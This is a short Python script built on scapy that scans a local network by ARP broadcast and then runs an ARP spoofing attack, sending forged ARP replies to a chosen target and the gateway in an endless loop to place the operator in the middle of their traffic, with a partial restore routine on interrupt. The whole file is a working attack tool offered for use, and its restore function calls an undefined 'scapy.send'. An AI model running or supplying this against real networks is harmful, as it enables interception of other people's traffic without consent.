from optparse import OptionParser
from scapy.all import *


def local_scan(ip):
        ip_gw = conf.route.route("0.0.0.0")[2]
        #print(ip_gw + ' #### ip_gateway #### ')
        apr_requests = ARP(pdst=ip)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_pack = broadcast / apr_requests
        answered_list = srp(arp_pack, timeout=5, verbose=False)[0]
        for element in answered_list:
                print(element[1].psrc + ' >>> ip_addr' + '   ' + '####',
                        element[1].hwsrc + ' >>> mac_addr')


def get_mac(target_ip):
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        #print(answered_list)
        return answered_list[0][1].hwsrc


def arp_spoof(ip_gw, ip_spoof):
        send_packet_count = 0
        mac_gw = get_mac(ip_gw)
        mac_spoof = get_mac(ip_spoof)
        packet_1 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip_spoof)
        packet_2 = ARP(op=2, pdst=ip_spoof, hwdst=mac_spoof, psrc=ip_gw)
        try:
            while True:
                send_packet_count += 2
                send(packet_1, verbose=False)
                send(packet_2, verbose=False)
                print('\r### was_send  ' + str(send_packet_count) + '  arp_packet ###', end="")
                time.sleep(1)
        except KeyboardInterrupt:
            print('#  Keyboard_Interrupt  #')
            restore_spoof(ip_gw, ip_spoof)


def restore_spoof(ip_gw, ip_spoof):     
        mac_gw = get_mac(ip_gw)
        mac_spoof = get_mac(ip_spoof)
        packet_1 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip_spoof, hwsrc=mac_spoof)
        packet_2 = ARP(op=2, pdst=ip_spoof, hwdst=mac_spoof, psrc=ip_gw, hwsrc=mac_gw)
        scapy.send(packet_1, count=4, verbose=False)
        scapy.send(packet_2, count=4, verbose=False)

def main():
	    parser = OptionParser("Usage: target_network spoof_ip gateway_ip ")   # Вывод справочной информации
	    parser.add_option("-n", '--network',type="string", dest="nwIP",help="scanning local network") # сеть
	    parser.add_option("-t", '--target',type="string", dest="tgIP",help="spoofing target")
	    parser.add_option("-g", '--gatewa',type="string", dest="gwIP",help="spoofing gateway")
	    options,args = parser.parse_args()  # создание экземпляра параметров, введенных пользователем
	    # получаем аргументы
	    network = options.nwIP
	    target = options.tgIP
	    gateway = options.gwIP

	    if network:
	        local_scan(network)

	    if target and gateway:
	    	arp_spoof(target, gateway)


if __name__ == "__main__":
    main()
